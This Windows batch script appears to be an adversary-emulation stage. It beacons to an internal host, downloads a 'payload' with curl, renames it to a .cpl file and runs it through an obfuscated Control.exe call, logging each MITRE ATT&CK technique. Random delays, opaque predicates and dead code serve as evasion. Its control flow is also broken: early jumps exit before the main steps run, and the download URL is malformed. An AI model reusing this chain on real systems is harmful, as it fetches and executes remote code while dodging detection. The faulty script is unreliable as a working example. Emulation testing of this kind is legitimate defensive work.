@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Initial random delay (30-60s)
SET /A initial_delay=!RANDOM! %% 31 + 30
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: initial_delay=!initial_delay!s>>> "%yydue%\!yydue!\macula-simulations.log" 2>nul
timeout /t !initial_delay! /nobreak >nul

REM Random variable names for PHR_ values
SET yktnwwf=%APPDATA%\8242\3c7b4d52
SET fpakbq=Macula-Stage0-8242
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8242-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=mspaint.txt
SET fpldhe=8242

REM Working directory setup
SET tmpdir=%APPDATA%\!yydue!
SET logfile=!tmpdir!\macula-simulations.log

REM State machine control
SET state=0
SET next_label=qwzxc

REM Dead code block (never reached)
GOTO dead_start

:dead_start
SET junk1=useless_data
SET junk2=more_junk
GOTO dead_middle

:dead_middle
ECHO This is never executed >nul
GOTO dead_end

:dead_end
EXIT /B 1

REM Main dispatcher with state machine
:dispatch_main
IF !state!==0 GOTO state_init
IF !state!==17 GOTO state_heartbeat
IF !state!==42 GOTO state_download
IF !state!==63 GOTO state_rename
IF !state!==85 GOTO state_execute
IF !state!==99 GOTO state_end
GOTO error_handler

:error_handler
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: invalid_state=!state!>>> "!logfile!" 2>nul
EXIT /B 1

REM Random mid-script delay
SET /A mid_delay=!RANDOM! %% 11 + 5
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: mid_delay=!mid_delay!s>>> "!logfile!" 2>nul
ping -n !mid_delay! 127.0.0.1 >nul

REM Initialize state 0
GOTO state_init

:state_init
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: state_init_start>>> "!logfile!" 2>nul

REM Create working directory
IF NOT EXIST "!tmpdir!" (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: mkdir_start=!tmpdir!>>> "!logfile!" 2>nul
    mkdir "!tmpdir!" >nul 2>&1
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: mkdir_complete>>> "!logfile!" 2>nul
)

SET state=17
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: state_init_complete=!state!>>> "!logfile!" 2>nul
GOTO dispatch_main

:dead_code_2
REM More dead code
SET fake_var=dead_value
GOTO dispatch_main

REM Heartbeat state 17
:state_heartbeat
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_start>>> "!logfile!" 2>nul

REM Always true opaque predicate
IF 1==1 (
    GOTO heartbeat_real
) ELSE (
    GOTO dead_code_2
)

:heartbeat_real
SET curl_cmd=curl -k -s -o nul "!rdzgrnne!"
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: curl_cmd=!curl_cmd!>>> "!logfile!" 2>nul
!curl_cmd!

REM Log TTP T1218.002 - Signed Binary Proxy Execution attempt
SET RESULT=1
SET ERR_DETAIL=
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: ttp_start=T1218.002>>> "!logfile!" 2>nul
(
    echo [!DATE:~-4,4!-!DATE:~-7,2!-!DATE:~-10,2! !TIME!][!omxgazu!]: !yydue!-!fpldhe!-T1218.002^|Signed_Binary_Proxy_Execution=!RESULT!^:!ERR_DETAIL!
) >> "!logfile!" 2>nul || echo >nul

SET state=42
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_complete=!state!>>> "!logfile!" 2>nul
GOTO dispatch_main

REM Download state 42
:state_download
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: download_start>>> "!logfile!" 2>nul

REM Opaque condition (always false)
IF 0==1 GOTO never_here

:never_here
REM Dead branch
EXIT /B 0

REM Change to temp directory
cd /d "!tmpdir!" >nul 2>&1
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: chdir=!cd!>>> "!logfile!" 2>nul

SET download_url=http://!repbmqg!/payload
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: download_url=!download_url!>>> "!logfile!" 2>nul

REM Download payload
SET dl_cmd=curl -k -s -o "!edjwtl!" "!download_url!"
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: download_cmd=!dl_cmd!>>> "!logfile!" 2>nul
!dl_cmd!

IF EXIST "!edjwtl!" (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: download_success>>> "!logfile!" 2>nul
    SET RESULT=1
    SET ERR_DETAIL=
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: download_failed>>> "!logfile!" 2>nul
    SET RESULT=0
    SET ERR_DETAIL=download_failed
)

REM Log TTP T1105 - Ingress Tool Transfer
(
    echo [!DATE:~-4,4!-!DATE:~-7,2!-!DATE:~-10,2! !TIME!][!omxgazu!]: !yydue!-!fpldhe!-T1105^|Ingress_Tool_Transfer=!RESULT!^:!ERR_DETAIL!
) >> "!logfile!" 2>nul || echo >nul

REM Random delay between operations
SET /A rnd_delay=!RANDOM! %% 15 + 5
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: random_delay=!rnd_delay!s>>> "!logfile!" 2>nul
CHOICE /C Y /N /D Y /T !rnd_delay! >nul

SET state=63
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: download_complete=!state!>>> "!logfile!" 2>nul
GOTO dispatch_main

:junk_label_1
REM More dead code interspersed
SET garbage=unused
GOTO dispatch_main

REM Rename state 63
:state_rename
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: rename_start>>> "!logfile!" 2>nul

REM Rename downloaded file to .cpl
IF EXIST "!edjwtl!" (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: rename_src=!edjwtl!>>> "!logfile!" 2>nul
    RENAME "!edjwtl!" file.cpl >nul 2>&1
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: rename_complete>>> "!logfile!" 2>nul
    SET RESULT=1
    SET ERR_DETAIL=
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: rename_failed>>> "!logfile!" 2>nul
    SET RESULT=0
    SET ERR_DETAIL=file_not_found
)

REM Log TTP T1036 - Masquerading
(
    echo [!DATE:~-4,4!-!DATE:~-7,2!-!DATE:~-10,2! !TIME!][!omxgazu!]: !yydue!-!fpldhe!-T1036.005^|Masquerading^:^Rename_System_Utilities=!RESULT!^:!ERR_DETAIL!
) >> "!logfile!" 2>nul || echo >nul

SET state=85
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: rename_complete=!state!>>> "!logfile!" 2>nul
GOTO dispatch_main

:dead_code_3
REM Another dead code block
FOR /L %%i IN (1,1,5) DO (
    ECHO Junk iteration %%i >nul
)
GOTO dispatch_main

REM Execute state 85
:state_execute
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: execute_start>>> "!logfile!" 2>nul

REM Final delay before execution
timeout /t 8 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: final_delay_complete>>> "!logfile!" 2>nul

REM Obfuscated LOLBin reference (Control.exe)
SET lolbin1=Cont
SET lolbin2=rol
SET lolbin=!lolbin1!!lolbin2!.exe

IF EXIST file.cpl (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: cpl_exists>>> "!logfile!" 2>nul
    SET exec_cmd=!lolbin! file.cpl
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: execute_cmd=!exec_cmd!>>> "!logfile!" 2>nul
    
    REM Execute and capture result
    !exec_cmd!
    IF !ERRORLEVEL!==0 (
        SET RESULT=1
        SET ERR_DETAIL=
    ) ELSE (
        SET RESULT=0
        SET ERR_DETAIL=execution_failed_!ERRORLEVEL!
    )
) ELSE (
    SET RESULT=0
    SET ERR_DETAIL=cpl_not_found
)

REM Log TTP T1218.002 - Signed Binary Proxy Execution result
(
    echo [!DATE:~-4,4!-!DATE:~-7,2!-!DATE:~-10,2! !TIME!][!omxgazu!]: !yydue!-!fpldhe!-T1218.002^|Signed_Binary_Proxy_Execution=!RESULT!^:!ERR_DETAIL!
) >> "!logfile!" 2>nul || echo >nul

SET state=99
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: execute_complete=!state!>>> "!logfile!" 2>nul
GOTO dispatch_main

REM End state 99
:state_end
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: cleanup_start>>> "!logfile!" 2>nul

REM Optional cleanup (kept minimal)
IF EXIST file.cpl (
    DEL file.cpl >nul 2>&1
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: cleanup_deleted_cpl>>> "!logfile!" 2>nul
)

echo [!DATE! !TIME!][DEBUG][!omxgazu!]: script_complete>>> "!logfile!" 2>nul
EXIT /B 0

REM Entry point (this is where execution actually starts after initial delay)
:start_here
GOTO dispatch_main

REM Another dead code section at end
:dead_final
SET final_junk=end_of_script
GOTO :EOF

REM Actual script start
GOTO start_here